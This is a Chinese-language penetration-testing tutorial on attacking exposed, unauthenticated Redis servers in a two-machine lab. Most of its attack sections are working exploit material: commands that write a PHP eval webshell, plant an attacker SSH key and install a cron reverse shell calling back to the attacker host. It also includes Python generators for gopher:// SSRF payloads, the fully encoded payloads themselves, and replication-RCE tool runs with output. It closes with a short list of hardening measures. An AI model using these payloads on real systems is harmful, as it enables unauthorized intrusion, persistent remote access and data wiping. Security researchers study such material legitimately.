# Redis 攻击方式

Author: H3rmesk1t

Data: 2022.02.24

# Redis 简介
[Introduction to Redis](https://redis.io/topics/introduction), `Redis`是一个使用`ANSI C`编写的开源、支持网络、基于内存、分布式、可选持久性的键值对存储数据库.

作为一个`key-value`存储系统, `Redis`和`Memcached`类似, 但是它支持存储的`value`类型相对更多，包括`strings`, `hashes`, `lists`, `sets`, `sorted sets with range queries`, `bitmaps`, `hyperloglogs`, `geospatial indexes`和`streams`. 这些数据类型都可以进行原子操作, 支持`push`/`pop`、`add`/`remove`及取交集并集和差集及更丰富的操作. 在此基础上, `Redis`支持各种不同方式的排序. 为了保证效率, 数据都是缓存在内存中, 与`memcached`有区别的是, `Redis`会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件, 并且在此基础上实现了`master-slave`(主从)同步操作.

`Redis`运行在内存中但是可以持久化到磁盘, 所以在对不同数据集进行高速读写时需要权衡内存, 因为数据量不能大于硬件内存. 在内存数据库方面的另一个优点是: 相比在磁盘上相同的复杂的数据结构, 在内存中操作起来非常简单, 这样`Redis`可以做很多内部复杂性很强的事情. 同时, 在磁盘格式方面它们是紧凑的以追加的方式产生的, 因为它们并不需要进行随机访问.

# Redis 环境搭建
后续漏洞复现均利用`Kali-Linux`来进行演示. 先下载并安装`Redis`:

```bash
wget http://download.redis.io/releases/redis-6.2.5.tar.gz
tar -zxvf redis-6.2.5.tar.gz
```

接着进入到解压好的`Redis`目录中, 通过`make`编译的方式来安装:

```bash
cd redis-6.2.5
make
```

当出现`Hint: It's a good idea to run 'make test'`字样时, 编译安装成功.

<div align=center><img src="./Redis%20攻击方式/1.png"></div>

编译安装结束后, 将`src/redis-server`和`src/redis-cli`拷贝到`/usr/bin`目录下(避免每次都进入安装目录启动`redis-server`和`redis-cli`):

```bash
sudo cp src/redis-server /usr/bin
sudo cp src/redis-cli /usr/bin
```

接着将`redis.conf`拷贝到`/etc`目录下:

```bash
sudo cp redis.conf /etc
```

最后使用`/etc/redis.conf`文件中的配置启动`redis`服务:

```bash
sudo redis-server /etc/redis.conf
```

<div align=center><img src="./Redis%20攻击方式/2.png"></div>

# Redis 基本用法
## redis-cli 命令
`Redis`命令用于在`redis`服务上执行操作, 要在`redis`服务上执行命令, 需要一个`redis`客户端, 在上文安装步骤时解压的安装包内含有该客户端.

本地执行命令时, 先启动`redis`客户端, 打开终端并输入命令`redis-cli`, 去连接本地的`redis`服务. 例如连接到本地的`redis`服务并执行`ping`命令(用于检测`redis`服务是否启动, 服务器运作正常的话, 会返回一个`PONG`字样:

```bash
redis-cli
127.0.0.1:6379> ping
PONG
127.0.0.1:6379> 
```

远程服务执行命令时, 同样是使用`redis-cli`命令:

```bash
redis-cli -h 127.0.0.1 -p 6379 -a "20010728"
127.0.0.1:6379> ping
PONG
127.0.0.1:6379> 
```

## SET 命令
`SET`命令用于设置给定`KEY`的值, 如果`KEY`已经存储其他值, `SET`就覆写旧值并且无视类型. `SET`命令基本语法如下:

```bash
SET KEY_NAME VALUE
```

## GET 命令
`GET`命令用于获取指定`KEY`的值, 如果`KEY`不存在, 则返回`nil`. `GET`命令基本语法如下:

```bash
GET KEY_NAME
```

## FLUSHALL 命令
`FLUSHALL`命令用于清空整个`Redis`服务器的数据(删除所有数据库的所有`KEY`). `FLUSHALL`命令基本语法如下:

```bash
FLUSHALL
```

## SAVE 命令
`SAVE`命令用于创建当前数据库的备份, `SAVE`命令执行一个同步保存操作, 将当前`Redis`实例的所有数据快照(snapshot)以默认`RDB`文件的形式保存到硬盘. `SAVE`命令基本语法如下:

```bash
SAVE
```

## CONFIG 命令
`CONFIG`命令用于恢复当前数据库的备份数据, 只需将备份文件(dump.rdb)移动到`redis`安装目录并启动服务即可. 获取`Redis`目录也可以使用`CONFIG`命令:

```bash
CONFIG GET dir
```

## Redis 配置
`Redis`的配置文件名为`redis.conf`(`Windows`下为`redis.windows.conf`), 通过`CONFIG`命令来查看或者设置配置项:

```bash
CONFIG GET *    // *为获取所有配置项, 这里也可以换成需要查看的配置项
```

<div align=center><img src="./Redis%20攻击方式/3.png"></div>

当需要编辑配置文件时, 可以通过修改`redis.conf`文件或使用`CONFIG set`命令来修改配置:

```bash
CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE
```

常见`redis.conf`配置项说明如下:

|配置项|说明|
|:----:|:----:|
|port: 6379|指定 Redis 监听端口, 默认端口为 6379|
|bind: 127.0.0.1 -::1|绑定的主机地址|
|timeout: 300|当客户端闲置多长秒后关闭连接, 指定为 0 时表示关闭该功能|
|databases: 16|设置数据库的数量, 默认数据库为 0, 可以使用 SELECT 命令在连接上指定数据库 id|
|save: <seconds> <changes>|指定在多长时间内, 有多少次更新操作, 就将数据同步到数据文件, 可以多个条件配合|
|dbfilename: dump.rdb|指定本地数据库文件名, 默认值为 dump.rdb|
|dir: ./|指定本地数据库存放目录|
|protected-mode: yes|关闭 protected-mode 模式, 此时外部网络可以直接访问; 开启 protected-mode 保护模式, 需配置 bind ip 或者设置访问密码|

## Redis 安全
可以通过`Redis`的配置文件设置密码参数, 这样做的好处在于, 当客户端连接到`Redis`服务时需要进行密码验证, 从而在一定程度上保证了`Redis`服务的安全性. 可以通过以下命令查看是否设置了密码验证, 默认情况下`requirepass`参数是空的, 无密码验证, 这就意味着无需通过密码验证就可以连接到`Redis`服务:

```bash
CONFIG get requirepass
```

可以通过`SET`命令来设置密码, 从而让客户端连接`Redis`时需要进行密码验证, 否则无法执行命令:

```bash
CONFIG set requirepass "20010728"
```

# Redis 未授权访问漏洞
## 基本概念
默认情况下, `Redis`会绑定在`0.0.0.0:6379`, 如果没有进行采用相关的策略(例如添加防火墙规则避免其他非信任来源`ip`进行访问等), 这样将会将`Redis`服务暴露在公网上. 当没有设置密码认证时, 会导致任意用户在可以访问目标服务器的情况下未授权访问`Redis`以及读取`Redis`的数据. 攻击者在未授权访问`Redis`的情况下, 可以利用`Redis`自身的提供的`CONFIG`命令向目标主机写`WebShell`、`SSH`公钥、创建计划任务反弹`Shell`等. 

利用思路: 
 - 先将`Redis`的本地数据库存放目录设置为`web`目录、`~/.ssh`目录或`/var/spool/cron`目录等, 然后将`dbfilename`(本地数据库文件名)设置为文件名你想要写入的文件名称, 最后再执行`SAVE`或`BGSAVE`进行保存即可.

利用条件: 
 - `Redis`绑定在`0.0.0.0:6379`且未进行添加防火墙规则避免非信任来源`IP`访问等相关安全保护操作, 而是直接暴露在公网上.
 - 未设置密码认证, 可以不使用密码远程登录`Redis`服务.
 - 关闭保护模式(设置`redis.conf`中的参数`protected-mode`的参数为`no`)

漏洞危害:
 - 攻击者无需认证就可以访问到内部数据, 可能导致敏感信息泄露, 或者执行`flushall`命令来清空所有数据.
 - 攻击者可通过`EVAL`执行`lua`代码, 或通过数据备份功能往磁盘写入后门文件.
 - 当`Redis`以`root`身份运行时, 攻击者可以给`root`账户写入`SSH`公钥文件, 从而直接通过`SSH`登录受害服务器.

## 漏洞演示
实验环境:
 - 攻击机Kali-Linux: 192.168.249.143
 - 受害机Kali-Linux: 192.168.249.145

`Redis.conf`配置:
 - 注释`bind 127.0.0.1 -::1`
 - 将`protected-mode yes`改成`protected-mode no`

<div align=center><img src="./Redis%20攻击方式/4.png"></div>

在攻击机上使用`Redis`客户端直接无账号成功登录受害机上的`Redis`服务端, 并且成功列出服务端`Redis`的信息:

```bash
redis-cli -h 192.168.249.145
```

<div align=center><img src="./Redis%20攻击方式/5.png"></div>

### 利用 Redis 写入 Webshell
利用条件:
 - 服务端的`Redis`连接存在未授权, 在攻击机上能用`redis-cli`直接登陆连接, 并未设置登陆验证.
 - 服务端存在开启的`Web`服务器, 并且知道`Web`目录的路径, 具有文件读写增删改查权限.

利用原理:
 - 在数据库中插入一条`Webshell`数据, 将此`Webshell`的代码作为`value`, `key`值随意, 然后通过修改数据库的默认路径为`/var/www/html`和默认的缓冲文件`shell.php`, 把缓冲的数据保存在文件里, 这样就可以在服务器端的`/var/www/html`目录下生成一个`Webshell`.

利用方式:
 - 将`dir`设置为`/var/www/html`目录, 将指定本地数据库存放目录设置为`/var/www/html`, 将`dbfilename`设置为文件名`shell.php`, 即指定本地数据库文件名为`shell.php`, 再执行`save`或`bgsave`, 则可以写入一个路径为`/var/www/html/shell.php`的`Webshell`文件.

操作步骤:

```bash
config set dir /var/www/html/ 
config set dbfilename shell.php
set xxx "\r\n\r\n<?php eval($_POST[h3]);?>\r\n\r\n"     // 用redis写入文件的会自带一些版本信息, 如果不换行可能会导致无法执行
save
```

<div align=center><img src="./Redis%20攻击方式/6.png"></div>

查看`/var/www/html`, 成功写入`Webshell`.

<div align=center><img src="./Redis%20攻击方式/7.png"></div>

<div align=center><img src="./Redis%20攻击方式/8.png"></div>

### 利用 Redis 写入 SSH 公钥
利用条件:
 - 服务端的`Redis`连接存在未授权, 在攻击机上能用`redis-cli`直接登陆连接, 并未设置登陆验证.
 - 服务端存在`.ssh`目录并且有写入的权限.

利用原理:
 - 在数据库中插入一条数据, 将本机的公钥作为`value`, `key`值随意, 然后通过修改数据库的默认路径为`/root/.ssh`和默认的缓冲文件`authorized.keys`, 把缓冲的数据保存在文件里, 这样就可以在服务器端的`/root/.ssh`下生成一个授权的`key`.

操作步骤:

 - 安装`openssh`服务.
```bash
# 安装 openssh 服务
sudo apt-get install openssh-server
# 启动 ssh 服务
sudo /etc/init.d/ssh start
# 配置 root 用户连接权限
sudo mousepad /etc/ssh/sshd_config
PermitRootLogin yes
# 设置允许通过免密登录
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
# 重启 ssh 服务
sudo /etc/init.d/ssh restart
```

<div align=center><img src="./Redis%20攻击方式/9.png"></div>


 - 在攻击机的`/root/.ssh`目录里生成`ssh`公钥`key`:
```bash
# 生成 rsa 密钥
ssh-keygen -t rsa
```

 - 将公钥导入`key.txt`文件(前后用`\n`换行, 避免和`Redis`里其他缓存数据混合), 再把`key.txt`文件内容写入服务端`Redis`的缓冲里:

```bash
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > /root/.ssh/key.txt
cat /root/.ssh/key.txt | redis-cli -h 192.168.249.145 -x set xxx    // -x 代表从标准输入读取数据作为该命令的最后一个参数。
```

 - 使用攻击机连接目标机器`Redis`, 设置`Redis`的备份路径为`/root/.ssh`, 保存文件名为`authorized_keys`, 并将数据保存在目标服务器硬盘上:

```bash
redis-cli -h 192.168.249.145
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```

 - 使用攻击机`ssh`连接目标受害机即可:

```bash
ssh 192.168.249.145
```

<div align=center><img src="./Redis%20攻击方式/10.png"></div>

### 利用 Redis 写入计划任务
利用原理:
 - 在数据库中插入一条数据, 将计划任务的内容作为`value`, `key`值随意, 然后通过修改数据库的默认路径为目标主机计划任务的路径, 把缓冲的数据保存在文件里, 这样就可以在服务器端成功写入一个计划任务进行反弹`shell`.

操作步骤:
 - 先在攻击机上开启监听:

```bash
nc -lnvvp 9999
```

 - 连接服务端的`Redis`, 写入反弹`shell`的计划任务:

```bash
redis-cli -h 192.168.249.145
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.249.143/9999 0>&1\n\n"
config set dir /var/spool/cron/crontabs/
config set dbfilename root
save
```

 - 等待大概一分钟左右, 在攻击机的`nc`中成功反弹`shell`回来.

这里需要注意的一点是, 利用`Redis`写入计划任务的方法只能在`Centos`上使用, 其原因为:
 - 因为默认`redis`写文件后是`644`的权限, 但`ubuntu`要求执行定时任务文件`/var/spool/cron/crontabs/<username>`权限必须是`600`也就是`-rw——-`才会执行, 否则会报错`(root) INSECURE MODE (mode 0600 expected)`, 而`Centos`的定时任务文件`/var/spool/cron/<username>`权限`644`也能执行.
 - `Redis`保存`RDB`会存在乱码, 在`Ubuntu`上会报错, 而在`Centos`上不会报错.

# Redis 未授权访问漏洞在 SSRF 中的利用
## 基本概念
在`SSRF`漏洞中, 当通过端口扫描等方法发现目标主机上开放`6379`端口, 则目标主机上很有可能存在`Redis`服务. 此时如果目标主机上的`Redis`由于没有设置密码认证或者没有进行添加防火墙等原因存在未授权访问漏洞的话, 就可以利用`Gopher`协议远程操纵目标主机上的`Redis`, 可以利用`Redis`自身的提供的`config`命令像目标主机写`WebShell`、写`SSH`公钥、创建计划任务反弹`Shell`等.

利用思路: 
 - 先将`Redis`的本地数据库存放目录设置为`web`目录、`~/.ssh`目录或`/var/spool/cron`目录等, 然后将`dbfilename`(本地数据库文件名)设置为文件名你想要写入的文件名称, 最后再执行`SAVE`或`BGSAVE`进行保存即可.

利用条件: 
 - `Redis`绑定在`0.0.0.0:6379`且未进行添加防火墙规则避免非信任来源`IP`访问等相关安全保护操作, 而是直接暴露在公网上.
 - 未设置密码认证, 可以不使用密码远程登录`Redis`服务.
 - 关闭保护模式(设置`redis.conf`中的参数`protected-mode`的参数为`no`)

漏洞危害:
 - 攻击者无需认证就可以访问到内部数据, 可能导致敏感信息泄露, 或者执行`flushall`命令来清空所有数据.
 - 攻击者可通过`EVAL`执行`lua`代码, 或通过数据备份功能往磁盘写入后门文件.
 - 当`Redis`以`root`身份运行时, 攻击者可以给`root`账户写入`SSH`公钥文件, 从而直接通过`SSH`登录受害服务器.

## 漏洞演示
实验环境:
 - 攻击机Kali-Linux: 192.168.249.143
 - 受害机Kali-Linux: 192.168.249.145
 - 假设此时在受害机上存在`Web`服务并且存在`SSRF`漏洞, 通过`SSRF`进行端口扫描后, 发现目标主机在`6379`端口上运行着一个`Redis`服务

`Redis.conf`配置:
 - 注释`bind 127.0.0.1 -::1`
 - 将`protected-mode yes`改成`protected-mode no`

<div align=center><img src="./Redis%20攻击方式/4.png"></div>

### 利用 Redis 写入 Webshell
操作步骤:
 - 先在`Web`服务器上放置一个含有`SSRF`漏洞的`PHP`文件:

```php
<?php
    function curl($url){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_exec($ch);
        curl_close($ch);
    }
    
    $url = $_GET['url'];
    curl($url);
?>
```

 - 接着连接`Redis`服务器, 构造`Redis`命令:

```bash
flushall
set ssrf '<?php eval($_POST["h3"]);?>'
config set dir /var/www/html
config set dbfilename shell_ssrf.php
save
```
 
 - 利用`Python`将上文中的`Redis`命令转换为`Gopher`协议的格式:

```python
import urllib

protocol = "gopher://"
ip = "192.168.249.145"
port = "6379"
passwd = ""

shell = "\n\n<?php eval($_POST[\"h3\"]);?>\n\n"
filename = "shell_ssrf.php"
path = "/var/www/html"

cmd = ["flushall",
	 "set ssrf {}".format(shell.replace(" ", "${IFS}")),
	 "config set dir {}".format(path),
	 "config set dbfilename {}".format(filename),
	 "save"
	]
if passwd:
	cmd.insert(0, "AUTH {}".format(passwd))

payload = protocol + ip + ":" + port + "/_"

def redis_format(arr):
	CRLF = "\r\n"
	redis_arr = arr.split(" ")
	cmd = ""
	cmd += "*" + str(len(redis_arr))
	for x in redis_arr:
		cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")
	cmd += CRLF
	return cmd

if __name__=="__main__":
	for x in cmd:
		payload += urllib.quote(redis_format(x))
	print payload
```

 - 将生成的`payload`进行`url`二次编码(因为我们发送payload用的是GET方法), 然后利用受害机服务器上的`SSRF`漏洞, 利用二次编码后的`payload`进行攻击:

```bash
gopher%3A%2F%2F192.168.249.145%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25244%250D%250Assrf%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522h3%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252414%250D%250Ashell_ssrf.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

 - 查看受害机的`Web`服务器, 成功写入`Webshell`:

<div align=center><img src="./Redis%20攻击方式/11.png"></div>

### 利用 Redis 写入 SSH 公钥
和上文提到的利用`Redis`写入`SSH`公钥方法类似, 这里只是利用`Gohper`协议来进行攻击, 这里就不进行具体的演示了, 给出攻击`Payload`:

操作步骤:
 - 在攻击机的`/root/.ssh`目录里生成`ssh`公钥:

```bash
ssh-keygen -t rsa
```

 - 利用生成的`id_rsa.pub`内容来构造`Redis`命令:

```bash
flushall
set ssrf 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa2jSWqMZiYwyPimrXs+XU1kbP4P28yFvofuWR6fYzgrybeO0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOawwTtXa1ZcS056mjPrKHHBNB2/hKINtJj1JX8R5Uz+3six+MVsxANT+xOMdjCq++1skSnPczQz2GmlvfAObngQK2Eqim+6xewOL+Zd2bTsWiLzLFpcFWJeoB3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe/LjJO6+59ihSRFWu99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq71fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk= root@kali'
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

 - 利用`Python`将上文中的`Redis`命令转换为`Gopher`协议的格式:

```python
import urllib

protocol = "gopher://"
ip = "192.168.249.145"
port = "6379"
passwd = ""

ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa2jSWqMZiYwyPimrXs+XU1kbP4P28yFvofuWR6fYzgrybeO0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOawwTtXa1ZcS056mjPrKHHBNB2/hKINtJj1JX8R5Uz+3six+MVsxANT+xOMdjCq++1skSnPczQz2GmlvfAObngQK2Eqim+6xewOL+Zd2bTsWiLzLFpcFWJeoB3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe/LjJO6+59ihSRFWu99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq71fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk= root@kali\n\n"
filename = "authorized_keys"
path = "/root/.ssh/"

cmd = ["flushall",
	 "set ssrf {}".format(ssh_pub.replace(" ", "${IFS}")),
	 "config set dir {}".format(path),
	 "config set dbfilename {}".format(filename),
	 "save"
	]
if passwd:
	cmd.insert(0, "AUTH {}".format(passwd))

payload = protocol + ip + ":" + port + "/_"

def redis_format(arr):
	CRLF = "\r\n"
	redis_arr = arr.split(" ")
	cmd = ""
	cmd += "*" + str(len(redis_arr))
	for x in redis_arr:
		cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")
	cmd += CRLF
	return cmd

if __name__=="__main__":
	for x in cmd:
		payload += urllib.quote(redis_format(x))
	print payload
```

 - 将生成的`payload`进行`url`二次编码(因为我们发送payload用的是GET方法), 然后利用受害机服务器上的`SSRF`漏洞, 利用二次编码后的`payload`进行攻击:

```bash
gopher%3A%2F%2F192.168.249.145%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25244%250D%250Assrf%250D%250A%2524566%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa2jSWqMZiYwyPimrXs%252BXU1kbP4P28yFvofuWR6fYzgrybeO0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOawwTtXa1ZcS056mjPrKHHBNB2%2FhKINtJj1JX8R5Uz%252B3six%252BMVsxANT%252BxOMdjCq%252B%252B1skSnPczQz2GmlvfAObngQK2Eqim%252B6xewOL%252BZd2bTsWiLzLFpcFWJeoB3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe%2FLjJO6%252B59ihSRFWu99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq71fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk%253D%2520root%2540kali%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%0D%0A
```

### 利用 Redis 写入计划任务
操作步骤:
 - 构造`Redis`的命令如下:

```bash
flushall
set ssrf '\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.249.143/9999 0>&1\n\n'
config set dir /var/spool/cron/
config set dbfilename root
save
```

 - 利用`Python`将上文中的`Redis`命令转换为`Gopher`协议的格式:

```python
import urllib

protocol = "gopher://"
ip = "192.168.249.145"
port = "6379"
passwd = ""
reverse_ip = "192.168.249.143"
reverse_port="9999"

cron = "\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n" % (reverse_ip, reverse_port)
filename = "root"
path = "/var/spool/cron"

cmd = ["flushall",
	 "set ssrf {}".format(cron.replace(" ", "${IFS}")),
	 "config set dir {}".format(path),
	 "config set dbfilename {}".format(filename),
	 "save"
	]
if passwd:
	cmd.insert(0, "AUTH {}".format(passwd))

payload = protocol + ip + ":" + port + "/_"

def redis_format(arr):
	CRLF = "\r\n"
	redis_arr = arr.split(" ")
	cmd = ""
	cmd += "*" + str(len(redis_arr))
	for x in redis_arr:
		cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")
	cmd += CRLF
	return cmd

if __name__=="__main__":
	for x in cmd:
		payload += urllib.quote(redis_format(x))
	print payload
```

 - 将生成的`payload`进行`url`二次编码(因为我们发送payload用的是GET方法), 然后利用受害机服务器上的`SSRF`漏洞, 利用二次编码后的`payload`进行攻击:

```bash
gopher%3A%2F%2F192.168.249.145%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25244%250D%250Assrf%250D%250A%252465%250D%250A%250A%250A%250A%250A%252A%2F1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520%2Fdev%2Ftcp%2F192.168.249.143%2F9999%25200%253E%25261%250A%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A%2Fvar%2Fspool%2Fcron%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%0D%0A
```

# Redis 主从复制 RCE
## Redis 主从复制概念
主从复制是指将一台`Redis`服务器的数据, 复制到其他的`Redis`服务器. 前者称为`master`(主节点), 后者称为`slave`(从节点). 数据的复制是单向的, 只能由主节点到从节点. 这是一种以空间置换时间的分布式的工作方案, 可以减轻主机缓存压力, 避免单点故障. 通过数据复制, `Redis`的一个`master`可以挂载多个`slave`, 而`slave`下还可以挂载多个`slave`, 形成多层嵌套结构. 所有写操作都在`master`实例中进行, `master`执行完毕后, 将写指令分发给挂在自己下面的`slave`节点. `slave`节点下如果有嵌套的`slave`, 会将收到的写指令进一步分发给挂在自己下面的`slave`.

<div align=center><img src="./Redis%20攻击方式/12.png"></div>

开启主从复制三种方式:
 - 配置文件：在从服务器的配置文件中加入`slaveof <masterip> <masterport>`.
 - 启动命令：`redis-server`启动命令后加入`--slaveof <masterip> <masterport>`.
 - 客户端命令：`Redis`服务器启动后, 直接通过客户端执行命令`slaveof <masterip>
<masterport>`, 则该`Redis`实例成为从节点.

## Redis 主从复制 Getshell
在`Reids 4.x`之后, `Redis`新增了模块功能, 通过外部拓展, 可以在`Redis`中实现一个新的`Redis`命令. 可以通过外部拓展(.so), 在`Redis`中创建一个用于执行系统命令的函数. [漏洞详细利用原理和利用代码编写方式](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

## 漏洞演示
实验环境:
 - 攻击机Kali-Linux: 192.168.249.143
 - 受害机: [Vulnhub-redis](https://github.com/vulhub/vulhub/tree/master/redis/4-unacc)

直接在对应文件夹下执行命令拉取对应漏洞环境: `sudo docker-compose up -d`.

<div align=center><img src="./Redis%20攻击方式/13.png"></div>

## 漏洞利用工具
### redis-rogue-server
下载地址:
 - [下载地址](https://github.com/n0b0dyCN/redis-rogue-server)
  
工具原理:
 - 该工具的原理就是首先创建一个恶意的`Redis`服务器作为`Redis`主机, 该`Redis`主机能够回应其他连接它的`Redis`从机的响应. 有了恶意的`Redis`主机之后, 就会远程连接目标`Redis`服务器, 通过`slaveof`命令将目标`Redis`服务器设置为恶意`Redis`的`Redis`从机. 然后将恶意`Redis`主机上的`exp`同步到`Reids`从机上, 并将`dbfilename`设置为`exp.so`. 最后再控制`Redis`从机加载模块执行系统命令. 需要注意的是, 该工具无法输入`Redis`密码进行`Redis`认证, 只能在目标存在`Redis`未授权访问漏洞时使用.

使用方法:

```bash
python3 redis-rogue-server.py --rhost 172.21.0.2 --lhost 192.168.249.143
```

成功执行后, 可以选择获得一个交互式的`shell`(interactive shell)或者是反弹`shell`(reserve shell):

<div align=center><img src="./Redis%20攻击方式/14.png"></div>

<div align=center><img src="./Redis%20攻击方式/15.png"></div>

### Redis Rogue Server
下载地址:
 - [下载地址](https://github.com/vulhub/redis-rogue-getshell)

使用方法:

```bash
➜ python3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c "id"

>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$13\r\n*.*.*.*\r\n$4\r\n8888\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'+OK\r\n'
>> receive data: b'PING\r\n'
>> receive data: b'REPLCONF listening-port 6379\r\n'
>> receive data: b'REPLCONF capa eof capa psync2\r\n'
>> receive data: b'PSYNC 7cce9210b3ad3f54043ce1965cda506bd26b0224 1\r\n'
>> send data: b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*2\r\n$11\r\nsystem.exec\r\n$2\r\nid\r\n'
>> receive data: b'$49\r\n\x08uid=999(redis) gid=999(redis) groups=999(redis)\n\r\n'
uid=999(redis) gid=999(redis) groups=999(redis)

>> send data: b'*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n'
>> receive data: b'+OK\r\n'
```

### redis-rce
下载地址:
 - [下载地址](https://github.com/Ridter/redis-rce)

使用方法:
 - 该工具有一个`-a`选项, 可以用来进行`Redis`认证, 弥补上面工具无法进行密码认证的缺陷. 但是这个工具里少一个`exp.so`的文件, 还需要添加一个可用的`exp.so`文件并复制到`redis-rce.py`同一目录下.

```bash
python3 redis-rce.py -r 172.21.0.2 -L 192.168.249.143 -f exp.so -a 20010728
```

# 安全防护策略
主要有以下几点来对`Redis`服务进行安全防护:
 - 禁止监听在公网地址
 - 修改默认的监听端口
 - 开启`Redis`安全认证并设置复杂的密码
 - 禁止使用`root`权限启动
 - 设置`Redis`配置文件的访问权限

# 参考
 - [redis主从复制RCE](https://lonmar.cn/2021/04/10/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/)

 - [Redis 攻击方法总结](https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Redis%20%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/)